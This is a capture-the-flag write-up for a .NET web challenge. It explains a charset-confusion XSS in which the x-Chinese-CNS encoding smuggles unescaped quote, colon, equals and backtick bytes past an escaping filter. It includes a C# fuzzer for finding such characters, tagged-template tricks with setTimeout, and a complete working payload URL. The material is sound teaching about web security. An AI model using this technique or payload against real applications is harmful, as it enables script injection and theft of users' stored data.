# Lost In Transliteration

## Setup

The challenge is written in C#. In the beginning of `Program.cs` we can find the following line:

```csharp
Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
```

This statement enables a broader range of character encodings within the application. By default, modern .NET platforms support only a limited set of Unicode encodings (like UTF-8 or UTF-16) and ASCII. However, with this registration, the available encodings expand significantly, including even those that are not ASCII-compatible.

Another feature of the challenge that should immediately catch attention is the `/file` endpoint. By default it's used to load JavaScript, for example with the following URL:

```
/file?filename=script.js&q=abc&ct=text/javascript
```

The `q` parameter is reflected in the content inside a snippet of JavaScript, for example:

```javascript
// Load the query from request.
// TODO: Maybe we should move this directly to HTML into a <script> tag?
window.q = 'abc';

// XSS prevention
const PAYLOADS = [`<script>`, `</script>`, `javascript:`, `onerror=`];
for (const payload of PAYLOADS) {
  if (window.q.toLowerCase().includes(payload)) {
    throw new Error('XSS!');
  }
```

Most characters are escaped, as determined by the `IsSafeChar` method, which dictates whether a given character requires escaping.

```csharp
private static bool IsSafeChar(char c)
{
  var cat = char.GetUnicodeCategory(c);
  // We don't consider ModifierLetter safe.
  var isLetter = cat == UnicodeCategory.LowercaseLetter ||
                 cat == UnicodeCategory.UppercaseLetter ||
                 cat == UnicodeCategory.OtherLetter;

  return isLetter || char.IsWhiteSpace(c);
}
```

With the `ct` parameter users can specify the Content-Type of the response. The Content-Type must be syntactically valid and must start with `text/`.

The goal of the challenge is to find an XSS and use it to steal the flag from `localStorage`.

## Intended solution

**WARNING: Spoilers ahead**

The fact that the challenge loads additional charsets is an immediate hint that the challenge will have something to do with them.

The endpoint `/file?filename=script.js`, which is originally loaded with `ct=text/javascript` can also be loaded as `text/html`. Because the content contains a `<script>` tag as well as an end tag `</script>`, it's still possible to inject JavaScript even when content is set to `text/html`.

In the `/file` endpoint, the content from the `q` parameter is reflected in the following context:

```javascript
window.q = 'value_of_q_reflected_here';
```

In order to break out of the context, it is necessary to either use `'` (to escape from a string) or `<` (to escape from a string tag). However these characters are escaped to `\u0027` and `\u003c` respectively because of `IsSafeChar`. Therefore some charset tricks must be employed to use these characters without escaping.

It's possible to pass the `charset` in the `ct` parameter, such as `ct=text/html;charset=utf-8`. The interesting part about .NET is that it's parsing the `charset` attribute and will emit a response in the specified charset.

So for example if you use the letter "ł" ([U+0142 Latin Small Letter L with Stroke](https://codepoints.net/U+0142)) and set charset to `utf-8` it will emit bytes `c5 82` but if you set charset to `utf-16`, it will emit bytes `01 42`.

Note that not all characters can be represented in all encodings. If you use "ł" and set the charset to `shift_jis`, .NET will emit an ASCII question mark (this will become important later).

Once `Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);` is called, the application supports numerous charsets. A crucial aspect here is that if a charset unsupported by browsers is specified, .NET will still encode characters using that encoding, while Chromium will default to windows-1252, a single-byte encoding.

This implies that an unsupported charset might include characters such as `'` or `<` within its multibyte sequences, which are then interpreted as their standard single-byte equivalents by browsers.

To find a useful encoding, we may write a simple fuzzer that will iterate over all encodings and over all characters from 0x0080 to 0xFFFF and check whether there's a `'` in the multibyte sequence.

Here's a code in C# that will help us with that:

```csharp
using System;
using System.Text;
using System.Linq;

public class Program
{
	public static void Main()
	{
		// Make sure all encodings are loaded.
		Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
		foreach (EncodingInfo ei in Encoding.GetEncodings().OrderBy(e => e.Name))
		{
			var e = ei.GetEncoding();
			var name = ei.Name;
			for (int i = 0x80; i < 0xFFFF; ++i)
			{
				if (char.IsSurrogate((char)i))
					continue;
				var c = char.ConvertFromUtf32(i);
				var bytes = e.GetBytes(c);
				if (bytes.Length < 2)
					continue;
				if (bytes.Contains((byte)0x27))
				{
					var url = Uri.EscapeDataString(c);
					Console.WriteLine($"{name}: U+{i:X4} ({url}) bytes: {BitConverter.ToString(bytes)}");
				}
			}
		}
	}
}
```

Note: You can test this code on [dotnetfiddle](https://dotnetfiddle.net/wDRvnc).

This code will output several interesting encodings but the one we'll focus on is `X-Chinese-CNS`, which outputs a lot of characters:

```
x-Chinese-CNS: U+4E0C (%E4%B8%8C) bytes: A1-27
x-Chinese-CNS: U+4F58 (%E4%BD%98) bytes: A3-27
x-Chinese-CNS: U+4FDC (%E4%BF%9C) bytes: A9-27
x-Chinese-CNS: U+51C8 (%E5%87%88) bytes: AE-27
x-Chinese-CNS: U+51D8 (%E5%87%98) bytes: C9-27
x-Chinese-CNS: U+554E (%E5%95%8E) bytes: B4-27
x-Chinese-CNS: U+55C2 (%E5%97%82) bytes: C2-27
x-Chinese-CNS: U+56DF (%E5%9B%9F) bytes: A2-27
[...]
```

At this point we can do a quick sanity check on one of these characters to ensure that using it will yield an unescaped `'` in the output. 

Therefore let’s try the following URL:

```
/file?filename=script.js&q=abc%E4%B8%8C&ct=text/javascript;charset=x-chinese-cns
```

which will output the following snippet:

```javascript
// TODO: Maybe we should move this directly to HTML into a <script> tag?
window.q = 'abc¡'';

// XSS prevention
const PAYLOADS = [`<script>`, `</script>`, `javascript:`, `onerror=`];
```

This proves that we can escape from the single-quoted string.

It’s not straightforward though to call arbitrary JS just yet. We cannot just inject `; alert(1)//` because all special characters would be escaped. So the only way for us to include any unescaped special characters is to use multibyte representations of characters from the x-Chinese-CNS encoding. This has the side effect that all special characters will be prepended by some other characters (as you can see with `¡'` in the example above). In each case, the code of these characters will be greater than 0xA0.

This makes it impossible to call functions using parentheses (as the closing parenthesis would have to be immediately prepended by some other character). However we can still use [tagged templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates). One eval-like function which works perfectly with tagged templates is `setTimeout`. You can verify that by calling:

```javascript
setTimeout`alert(1)`
```

We cannot directly use `` setTimeout` `` though because, as already mentioned, all characters that precede the special characters (such as `` ` ``) are always above 0xA0. Luckily, some of these characters are valid JS identifiers. 

For example, in x-Chinese-CNS the character U+5ADD is encoded to `0xC9 0x60`. In windows-1250 `0xC9` is É which is valid in JS identifiers, while `0x60` is `\``. So what we can do is to assign setTimeout to a variable called `É` and then call it using tagged templates. The following code illustrates the idea:

```javascript
É=setTimeout;
É`alert(1)//É`;
```

Another problematic character is `;` which we cannot use for the similar reasons as `)`. In this case [automatic semicolon insertion](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar#automatic_semicolon_insertion) comes to the rescue. We need to ensure that we’re using new lines at the end of our statements and JS will take care of the rest.

The last missing piece is making sure our code is syntactically valid. First, notice that our JS code starts with the following:

```html
<script> tag?
window.q = 'query_here';
```

The identifier `tag` is part of the JS code and it would cause a `ReferenceError` doing execution due to an undefined identifier. We can use [hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting) to get around that and just define `var tag` later in the code.

Then we have the question mark which is the beginning of [the ternary operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Conditional_operator). It is always of the form: `condition ? trueExpresion : falseExpression`. Therefore, we need to make sure that our payload includes the `:` character. As usual this character will be prepended with another one. So consider the following example:

```js
tag ? window.q = 'abcÉ' É: something_else 
```

This is a syntax error because the `É` identifier directly follows a string. We need to insert something between the end of the string and the identifier. One solution is to use the `in` operator. Then `something_else` needs to be changed to a valid identifier, so that we don’t get a `ReferenceError`. In the end, we’ll get:

```js
tag ? window.q = ‘abcÉ’ in É : alert
```

At this point our injection looks as follows:

```js
 // TODO: Maybe we should move this directly to HTML into a <script> tag?
window.q = 'abcÉ' in É: alert
var É=setTimeout
É`{some code here}É`
var tag
';

// XSS prevention
const PAYLOADS = [`<script>`, `</script>`, `javascript:`, `onerror=`];
```

The ultimate missing part is to ensure that we won’t get a syntax error after `var tag`. This is actually easy and the only thing we need to do is to insert yet another tagged template, so: `É\``. This will work because the final snippet of the code will be equivalent to:

```js
É`[...]` < script >`,`
``` 

Which is just a tagged template with some comparisons.

Let’s now consider the place that was marked with `{some code here}` in the snippet above. This will be the actual code that we’ll want to execute. In this place we don’t need to worry about escaped characters -- because we’re in a template literal, the JS runtime will unescape these characters anyway.

The final injection is:

```
xÉ'in É:alert
var É=setTimeout
É`alert(1)//É`
var tag
É`
```

Now we just need to find valid codepoints in the charset X-Chinese-CNS for each sequence of `É` and the subsequent character. [Again we can write a script in C#](https://dotnetfiddle.net/6cKz1S) that will yield the following codes:

```
U+51D8 (%E5%87%98): '
U+5604 (%E5%98%84): :
U+5889 (%E5%A2%89): =
U+5ADD (%E5%AB%9D): `
```

So in the end we have the following payload:

```
/file?filename=script.js&ct=text/html;charset=x-Chinese-CNS&q=x%E5%87%98in+%E5%98%84alert%0avar+%E5%A2%89setTimeout%0a%E5%AB%9Dalert(1)//%E5%AB%9D%0avar+tag%0a%E5%AB%9D
```



